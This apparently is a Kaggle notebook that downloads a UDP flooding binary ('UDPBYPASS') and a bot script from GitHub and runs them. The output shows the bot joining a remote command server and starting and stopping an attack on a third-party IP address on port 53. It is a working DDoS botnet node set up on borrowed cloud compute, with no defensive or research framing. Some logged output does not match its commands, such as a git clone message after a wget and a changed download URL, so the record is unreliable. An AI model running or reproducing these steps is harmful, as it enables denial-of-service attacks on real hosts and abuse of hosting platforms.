# %%
! wget https://github.com/OEFm44xrH/AALLLVSUJNVN/raw/refs/heads/main/UDPBYPASS
# Out:
# Cloning into 'Zxd'...
# remote: Enumerating objects: 405, done.
# remote: Counting objects: 100% (182/182), done.
# remote: Compressing objects: 100% (33/33), done.
# remote: Total 405 (delta 165), reused 149 (delta 149), pack-reused 223 (from 1)
# Receiving objects: 100% (405/405), 7.71 MiB | 18.15 MiB/s, done.
# Resolving deltas: 100% (232/232), done.

# %%
cd Zxd
# Out:
# /kaggle/working/Zxd

# %%
! chmod +rx ./UDPBYPASS

# %%
! wget https://raw.githubusercontent.com/OEFm44xrH/SEZEFWSWRXZT/refs/heads/main/bot.py
# Out:
# --2026-04-20 09:47:59--  https://raw.githubusercontent.com/ondirisuliuly/milkor7394/refs/heads/main/bot.py
# Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.109.133, ...
# Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
# HTTP request sent, awaiting response... 200 OK
# Length: 3333 (3.3K) [text/plain]
# Saving to: ‘bot.py’
#
# bot.py              100%[===================>]   3.25K  --.-KB/s    in 0s
#
# 2026-04-20 09:47:59 (56.9 MB/s) - ‘bot.py’ saved [3333/3333]

# %%
! python3 bot.py
# Out:
# ...
#   Bot ID: Bot-2cb949
#   Server: http://91.184.249.148:5000
#   Tool:   ./UDPBYPASS
# ...
# Bot is running in background and listening to API.
# Press Ctrl+C to exit and stop all attacks.
# ...
#
# [+] Command START 80.235.54.10:53. Running tool...
# [OK] Attack on 80.235.54.10 started (PID: 107)
# [*] Command STOP for 80.235.54.10. Killing PID 107...
# [OK] Attack on 80.235.54.10 stopped.
# ^C
#
# [*] Exiting... Stopping local attacks...
# [OK] Done.
